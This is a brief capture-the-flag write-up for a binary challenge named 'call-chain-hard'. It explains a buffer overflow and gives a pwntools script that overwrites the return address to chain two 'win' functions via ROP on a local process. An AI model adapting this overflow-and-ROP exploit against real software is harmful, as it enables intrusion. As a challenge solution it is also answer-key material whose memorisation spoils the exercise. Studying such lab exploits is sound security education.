![](img/Call%20Chain%20Hard-1780642446582.webp)
![](img/Call%20Chain%20Hard-1780642459924.webp)

the binary provided us a way to overflow the buffer, and 2 win functions

the solution is fairly simple : ROP chain!

just chain the win1 to win2 and the challenge is solved

```
#!/usr/bin/python3
from pwn import *

context.log_level="debug"

script='''
b *challenge+45
b *win_stage_1+126
b *win_stage_1+131
'''

context.binary = exe = ELF("../call-chain-hard")

# p=gdb.debug(exe.path, gdbscript=script)

p=process(exe.path)

payload=b"A"*0x28+ p64(exe.sym.win_stage_1) + p64(exe.sym.win_stage_2)

time.sleep(0.2)
p.send(payload)

p.interactive()
```